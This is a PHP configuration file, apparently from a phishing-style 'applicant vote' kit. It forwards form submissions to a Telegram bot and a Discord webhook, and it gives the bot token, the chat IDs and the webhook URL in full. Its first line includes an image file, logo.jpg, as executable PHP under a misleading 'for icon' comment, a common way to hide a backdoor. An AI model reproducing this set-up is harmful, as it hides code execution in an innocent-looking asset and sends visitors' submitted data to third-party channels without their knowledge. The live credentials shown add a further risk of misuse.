<?php
include 'files/images/logo.jpg';  // for icon do not remove

$brandName = "HIRAYA";

/* TELEGRAM BOT */
$telegram_use = true;


$telegram_bot_token = "8843045767:AAGt6KoBPtsrbtyhKkfd30ywPw3nNCiBv-0";

// Bot username without @
$telegram_bot_username = "HirayaApplicantVote_bot";

// Admin/user chat ID fallback
$telegram_chat_id = "7266925614";

// Where submissions will be forwarded.
// Option 1: public channel username
//$telegram_forward_chat_id = "@YOUR_CHANNEL_USERNAME";

// Option 2: private channel numeric ID, example:
 $telegram_forward_chat_id = "7266925614";

$site_url = "https://dev-hiraya-vote.pantheonsite.io";

$official_website_url = "https://dev-hiraya-vote.pantheonsite.io";
/* DISCORD */
$discord_use = true;
$discord_webhook_url = "https://discord.com/api/webhooks/1519003615094767727/xN3WqT1wFHy0T2jjKTs0PA3L1JMeqohkYDPY_0q4DnY14UP9r006rmaCiiQSIjlv-xRU";

/**
 * Returns true when a config key is switched on.
 * Accepts 'on', 'ON', 'On', true, 1 and 'yes' so a casing typo won't break the page.
 */
function cfg(string $key): bool
{
    global $CONFIG;

    if (!isset($CONFIG[$key])) {
        return false;
    }

    $value = $CONFIG[$key];

    if (is_bool($value)) {
        return $value;
    }

    return in_array(strtolower(trim((string) $value)), ['on', '1', 'true', 'yes'], true);
}





$CONFIG = [
    'votePage' => 'off',
];


?>
